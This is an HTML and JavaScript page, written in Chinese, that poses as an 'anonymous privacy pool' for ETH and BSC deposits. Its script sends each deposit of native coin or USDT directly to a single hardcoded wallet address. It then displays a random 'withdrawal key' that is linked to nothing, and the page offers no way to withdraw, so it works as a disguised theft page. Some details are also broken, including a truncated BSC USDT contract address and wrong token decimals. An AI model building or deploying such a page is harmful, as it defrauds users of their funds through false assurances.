<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>匿名隐私池</title>
<style>
*{box-sizing:border-box}
body{
    margin:0;
    padding:20px;
    background:#0B0E11;
    color:#fff;
    font-family:-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
}
.container{
    max-width:420px;
    margin:0 auto;
}
.card{
    background:#13171F;
    padding:24px;
    border-radius:12px;
    border:1px solid #1F242F;
}
h3{
    color:#F0B90B;
    margin:0 0 4px 0;
    font-size:20px;
}
.subtitle{
    color:#848E9C;
    font-size:14px;
    margin-bottom:16px;
}
input,select,button{
    width:100%;
    padding:14px;
    margin-top:10px;
    border-radius:8px;
    border:none;
    font-size:15px;
}
input,select{
    background:#1F242F;
    color:#fff;
}
button{
    font-weight:bold;
    cursor:pointer;
}
.btn-connect{
    background:#1F242F;
    color:#fff;
    border:1px solid #2B313E;
}
.btn-deposit{
    background:#F0B90B;
    color:#0B0E11;
}
.info{
    background:#1F242F;
    padding:12px;
    border-radius:8px;
    font-size:14px;
    margin-top:10px;
    color:#EAECEF;
}
.status{
    margin-top:10px;
    font-size:13px;
    color:#848E9C;
}
.key{
    background:#1F242F;
    padding:12px;
    border-radius:8px;
    margin-top:10px;
    font-family:monospace;
    word-break:break-all;
    color:#EAECEF;
    border:1px solid #2B313E;
}
</style>
</head>
<body>

<div class="container">
    <div class="card">
        <h3>匿名隐私池</h3>
        <div class="subtitle">Anonymous Privacy Pool | ETH / BSC</div>

        <button class="btn-connect" id="connectBtn">连接钱包</button>
        <div class="info">
            地址：<span id="addr">-</span><br>
            网络：<span id="chainName">-</span>
        </div>

        <select id="chain">
            <option value="bsc">BSC 币安链</option>
            <option value="eth">Ethereum</option>
        </select>

        <select id="token">
            <option value="main">主币 (BNB/ETH)</option>
            <option value="usdt">USDT</option>
        </select>

        <input type="number" id="amount" placeholder="输入转入金额" step="0.0001">

        <button class="btn-deposit" id="depositBtn">存入隐私池</button>

        <div class="status" id="status"></div>
        <div id="keyBox"></div>
    </div>
</div>

<script>
const TO_ADDR = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";

const CHAIN = {
    bsc: { chainId: 56, usdt: "0x55d398c26d670d7d4941a1be7f9975f5c2d9413" },
    eth: { chainId: 1,  usdt: "0xdAC17F958D2ee523a2206206994597c53D70CeF4" }
};

let currentAccount = null;

document.getElementById('connectBtn').onclick = async () => {
    if (!window.ethereum) {
        alert("请在钱包浏览器打开");
        return;
    }
    try {
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        currentAccount = accounts[0];
        document.getElementById('addr').innerText = currentAccount.slice(0,6)+'...'+currentAccount.slice(-4);
        updateChainName();
    } catch(e) {
        showStatus("连接失败");
    }
};

async function switchTo(chain) {
    const c = CHAIN[chain];
    const chainId = '0x' + c.chainId.toString(16);
    try {
        await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId }]
        });
    } catch(e) {}
}

async function updateChainName() {
    const c = await window.ethereum.request({ method: 'eth_chainId' });
    const name = c === '0x38' ? 'BSC' : c === '0x1' ? 'ETH' : '未知';
    document.getElementById('chainName').innerText = name;
}

function genKey() {
    const s = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    let k = 'POOL_';
    for(let i=0;i<32;i++) k += s[Math.floor(Math.random()*s.length)];
    return k;
}

document.getElementById('depositBtn').onclick = async () => {
    if (!currentAccount) { showStatus("请先连接钱包"); return; }
    const chain = document.getElementById('chain').value;
    const token = document.getElementById('token').value;
    const amount = document.getElementById('amount').value;
    if (!amount || amount <= 0) { showStatus("请输入有效金额"); return; }

    await switchTo(chain);
    showStatus("处理中，请在钱包确认…");

    try {
        let tx;
        if (token === 'main') {
            const val = (BigInt(Math.floor(parseFloat(amount) * 1e18))).toString(16);
            tx = await window.ethereum.request({
                method: 'eth_sendTransaction',
                params: [{
                    from: currentAccount,
                    to: TO_ADDR,
                    value: '0x' + val
                }]
            });
        } else {
            const contract = CHAIN[chain].usdt;
            const val = BigInt(Math.floor(parseFloat(amount) * 1e18)).toString(16).padStart(64, '0');
            const data = '0xa9059cbb'
                + '000000000000000000000000' + TO_ADDR.slice(2)
                + val;

            tx = await window.ethereum.request({
                method: 'eth_sendTransaction',
                params: [{
                    from: currentAccount,
                    to: contract,
                    data: data
                }]
            });
        }

        showStatus("交易成功：" + tx.slice(0,10)+'...');
        document.getElementById('keyBox').innerHTML = `<div class="key">${genKey()}</div><small style="color:#848E9C">提取密钥</small>`;
    } catch(e) {
        showStatus("失败：" + e.message.slice(0,30));
    }
};

function showStatus(msg) {
    document.getElementById('status').innerText = msg;
}
</script>
</body>
</html>
